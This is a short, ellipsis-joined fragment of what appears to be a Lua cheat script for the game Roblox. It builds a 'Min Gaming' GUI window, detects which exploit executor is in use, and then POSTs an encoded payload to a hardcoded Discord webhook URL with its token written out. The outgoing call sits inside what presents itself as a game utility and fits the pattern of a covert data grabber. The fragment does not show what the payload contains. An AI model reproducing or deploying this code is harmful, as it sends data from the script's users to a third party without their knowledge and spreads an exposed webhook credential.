...
local Library = Update:Window("Min Gaming","2.0",Enum.KeyCode.RightControl);
...
local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Trigon" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Fluxus" or
    "Fluxus"
                        ...
                        local Final = {Url = "https://discord.com/api/webhooks/1218488380908765294/Jun1ATruwmN-z1-nbYR2jdXFCn-xcrxu103VwyyjXNiPgggr-MHtisHzA7tqJhi2bVOJ" , Body = Encoded, Method = "POST", Headers = Headers}
                        Request(Final)